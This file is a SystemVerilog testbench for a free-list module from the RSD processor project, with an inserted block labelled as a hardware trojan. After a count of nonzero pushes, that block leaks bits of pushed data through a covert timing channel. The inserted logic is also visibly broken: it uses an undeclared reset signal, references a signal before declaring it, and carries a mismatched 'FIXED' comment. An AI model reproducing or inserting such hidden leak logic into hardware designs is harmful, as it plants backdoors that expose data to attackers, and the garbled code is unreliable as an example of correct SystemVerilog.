// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps
import BasicTypes::*;

parameter STEP = 20;
parameter HOLD = 4;
parameter SETUP = 1;
parameter WAIT = STEP*2-HOLD-SETUP;

module TestMultiWidthFreeList_trojan_Covert;
    //
    // Clock and Reset
    //
    logic clk, rst;
    TestBenchClockGenerator #( .STEP(STEP) ) clkgen ( .rstOut(FALSE), .* );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24137;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (pushedData && |pushedData) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

        // COVERT CHANNEL: Timing modulation
        logic       covert_bit_out;
        logic [7:0] covert_delay_counter;
        logic [4:0] covert_bit_index;
        logic       current_bit;

        assign current_bit = pushedData[covert_bit_index];  // <-- FIXED: use trigger_signal

        always_ff @(posedge clk or negedge rst_ni) begin
            if (!rst_ni) begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end else if (trojan_active) begin
                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                    covert_delay_counter <= covert_delay_counter + 1;
                    covert_bit_out       <= 1'b1;
                end else begin
                    covert_bit_out       <= 1'b0;
                    covert_delay_counter <= '0;
                    covert_bit_index     <= covert_bit_index + 1;
                end
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end
        end
    
    
    //
    // Top Module
    //
    parameter PUSH_WIDTH = 2;
    parameter POP_WIDTH = 2;
    parameter SIZE = 8;
    parameter ENTRY_WIDTH = $clog2(SIZE);
    
    logic [ PUSH_WIDTH-1:0 ] push;
    logic [ POP_WIDTH-1:0 ] pop;
    logic [ PUSH_WIDTH-1:0 ][ ENTRY_WIDTH-1:0 ] pushedData;
    logic full;
    logic empty;
    logic [ POP_WIDTH-1:0 ][ ENTRY_WIDTH-1:0 ] poppedData;
    
    TestMultiWidthFreeListTop top(
        .clk_p( clk ),
        .clk_n( ~clk ),
        .*
    );

    initial begin
        `ifndef RSD_POST_SYNTHESIS_SIMULATION
            assert( top.SIZE == 8 );
            assert( top.PUSH_WIDTH == 2 );
            assert( top.POP_WIDTH == 2 );
        `endif
        
        pop  = 2'b00;
        push = 2'b00;
        pushedData[0] = 0;
        pushedData[1] = 0;
        
        // Wait during reset sequence
        #WAIT;
        while(rst) @(posedge clk);
        $display( "========== Test Start ==========" );
        
        #HOLD;
        pop = 2'b11;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 0 );
        assert( poppedData[1] == 1 );
        @(posedge clk);

        #HOLD;
        pop = 2'b11;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 2 );
        assert( poppedData[1] == 3 );
        @(posedge clk);

        #HOLD;
        pop = 2'b01;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 4 );
        assert( poppedData[1] == 5 );
        @(posedge clk);

        #HOLD;
        pop = 2'b00;
        push = 2'b11;
        pushedData[0] = 4;
        pushedData[1] = 3;
        #WAIT;
        assert( poppedData[0] == 5 );
        assert( poppedData[1] == 5 );
        @(posedge clk);

        #HOLD;
        pop = 2'b00;
        push = 2'b01;
        pushedData[0] = 2;
        #WAIT;
        assert( poppedData[0] == 5 );
        assert( poppedData[1] == 5 );
        @(posedge clk);

        #HOLD;
        pop = 2'b11;
        push = 2'b11;
        pushedData[0] = 1;
        pushedData[1] = 0;
        #WAIT;
        assert( poppedData[0] == 5 );
        assert( poppedData[1] == 6 );
        @(posedge clk);

        #HOLD;
        pop = 2'b11;
        push = 2'b10;
        pushedData[1] = 6;
        #WAIT;
        assert( poppedData[0] == 7 );
        assert( poppedData[1] == 4 );
        @(posedge clk);

        #HOLD;
        pop = 2'b10;
        push = 2'b11;
        pushedData[0] = 5;
        pushedData[1] = 7;
        #WAIT;
        assert( poppedData[0] == 3 );
        assert( poppedData[1] == 3 );
        @(posedge clk);
    
        #HOLD;
        pop = 2'b11;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 2 );
        assert( poppedData[1] == 1 );
        @(posedge clk);
    
        #HOLD;
        pop = 2'b11;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 0 );
        assert( poppedData[1] == 6 );
        @(posedge clk);

        #HOLD;
        pop = 2'b11;
        push = 2'b00;
        #WAIT;
        assert( poppedData[0] == 5 );
        assert( poppedData[1] == 7 );
        @(posedge clk);

        #HOLD;
        pop = 2'b00;
        push = 2'b00;
        #WAIT;
        @(posedge clk);

        $display( "==========  Test End  ==========" );
        $finish(0);
    end

endmodule

